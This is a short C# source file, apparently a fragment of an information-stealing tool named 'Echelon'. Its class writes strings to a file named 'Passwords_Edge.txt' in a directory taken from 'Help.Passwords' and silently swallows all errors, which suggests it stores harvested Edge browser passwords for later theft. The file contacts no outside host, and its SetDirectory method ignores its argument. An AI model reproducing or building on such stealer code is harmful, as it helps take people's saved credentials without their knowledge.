using System.Collections.Generic;
using System.IO;

namespace Echelon
{
    public static class DesktopWriter
    {
        private static string directory = "";

        public static void SetDirectory(string dir)
        {
            try
            {
                directory = Help.Passwords;
            }
            catch { }
        }

        public static void WriteLine(string str)
        {
            try
            {
                var fn = Path.Combine(directory, "Passwords_Edge.txt");
                File.AppendAllLines(fn, new List<string> { str });
            }
            catch { }
        }
    }
}